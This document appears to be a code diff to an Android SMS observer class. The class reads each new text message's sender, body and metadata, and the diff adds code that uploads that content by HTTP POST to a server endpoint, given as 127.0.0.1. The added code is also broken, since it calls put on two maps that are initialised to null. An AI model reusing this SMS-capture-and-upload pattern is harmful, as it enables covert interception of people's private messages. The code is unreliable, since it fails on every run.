@@ -7,6 +7,8 @@ import android.os.Message;
 import android.util.Log;
 import android.net.Uri;
 
+import java.util.Map;
+
 
 public class SmsObserver extends ContentObserver {
     private ContentResolver cresolver;
@@ -30,30 +32,38 @@ public class SmsObserver extends ContentObserver {
         }
         else{
             SmsInfo smsinfo = new SmsInfo();
+            Map<String,String> pmap = null;
+            Map<String,String> hmap = null;
             if (cursor.moveToFirst()) {
-                if (smsinfo.action == 0) {
-                    int idIndex = cursor.getColumnIndex("_id");
-                    if (idIndex != -1) {
-                        smsinfo.id = cursor.getString(idIndex);
-                    }
-                    int threadIndex = cursor.getColumnIndex("thread_id");
-                    if (threadIndex != -1) {
-                        smsinfo.thread_id = cursor.getString(threadIndex);
-                    }
-                    int addressIndex = cursor.getColumnIndex("address");
-                    if (addressIndex != -1) {
-                        smsinfo.smsAddress = cursor.getString(addressIndex);
-                    }
-                    int bodyIndex = cursor.getColumnIndex("body");
-                    if (bodyIndex != -1) {
-                        smsinfo.smsBody = cursor.getString(bodyIndex);
-                    }
-                    int readIndex = cursor.getColumnIndex("read");
-                    if (readIndex != -1) {
-                        smsinfo.read = cursor.getString(readIndex);
-                    }
-                    Log.i("smswatch", smsinfo.toString());
+                int idIndex = cursor.getColumnIndex("_id");
+                if (idIndex != -1) {
+                    smsinfo.id = cursor.getString(idIndex);
                 }
+                int threadIndex = cursor.getColumnIndex("thread_id");
+                if (threadIndex != -1) {
+                    smsinfo.thread_id = cursor.getString(threadIndex);
+                }
+                int addressIndex = cursor.getColumnIndex("address");
+                if (addressIndex != -1) {
+                    smsinfo.smsAddress = cursor.getString(addressIndex);
+                }
+                int bodyIndex = cursor.getColumnIndex("body");
+                if (bodyIndex != -1) {
+                    smsinfo.smsBody = cursor.getString(bodyIndex);
+                }
+                int readIndex = cursor.getColumnIndex("read");
+                if (readIndex != -1) {
+                    smsinfo.read = cursor.getString(readIndex);
+                }
+                Log.i("smswatch", smsinfo.toString());
+                pmap.put("smsinfo",smsinfo.toString());
+                hmap.put("smsinfo","1");
+                try {
+                    HttpRequestUtil.sendPost("http://127.0.0.1", pmap, hmap);
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+
             }
 
                 Message msg = smshandler.obtainMessage();
